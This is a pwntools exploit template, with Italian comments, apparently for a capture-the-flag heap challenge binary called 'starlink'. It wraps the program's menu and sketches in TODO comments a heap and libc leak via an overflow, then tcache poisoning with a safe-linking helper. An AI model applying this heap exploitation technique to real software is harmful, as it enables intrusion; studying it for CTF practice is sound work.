from pwn import *

# Impostazioni di base
elf = context.binary = ELF('./starlink')
libc = ELF('./libc.so.6')
context.terminal = ['tmux', 'splitw', '-h']

def start():
    if args.REMOTE:
        return remote("INDIRIZZO", 10305) # Sostituisci con IP e Porta
    elif args.GDB:
        return gdb.debug([elf.path], gdbscript='''
        ''')
    else:
        return elf.process()

io = start()

# --- Wrapper per interagire col menu ---

def setup(number, secret, name):
    io.sendlineafter(b"favorite number ?", str(number).encode())
    io.sendlineafter(b"secret word", secret)
    io.sendlineafter(b"name ?", name)

def create(name, content):
    io.sendlineafter(b"Exit", b"1")
    io.sendlineafter(b"name (max 24):", name)
    io.sendlineafter(b"content (max 256):", content)

def update(old_name, new_content):
    io.sendlineafter(b"Exit", b"2")
    io.sendlineafter(b"update:", old_name)
    io.sendlineafter(b"content :", new_content)

def delete(name):
    io.sendlineafter(b"Exit", b"3")
    io.sendlineafter(b"delete:", name)

def edit_description(length, payload):
    io.sendlineafter(b"Exit", b"4")
    io.sendlineafter(b"description", b"2") # 2.edit description
    io.sendlineafter(b"correct?", str(length).encode())
    io.sendafter(b"correction:", payload)

# --- FASE 1: Setup iniziale ---
setup(1337, b"secret_test", b"pwn_player")

# --- FASE 2: Leak Heap & Libc ---
# TODO: Alloca dei chunk con create(), poi eliminali con delete() per popolare la tcache e l'unsorted bin.
# create(b"A", b"AAAA")
# create(b"B", b"BBBB")
# ...
# Usa edit_description per fare overflow e sovrascrivere / leggere l'heap.
# edit_description(500, b"A"*offset) 
# io.recvuntil(b"A"*offset)
# leak = u64(io.recv(6).ljust(8, b"\x00"))
# log.info(f"Leak: {hex(leak)}")

# --- FASE 3: Exploit ---
# Una volta che hai libc_base e heap_base, prepara il Tcache Poisoning.
# Poiché è Libc 2.35+, ricordati il Safe-Linking!
# def safe_link(heap_addr, target):
#     return (heap_addr >> 12) ^ target

io.interactive()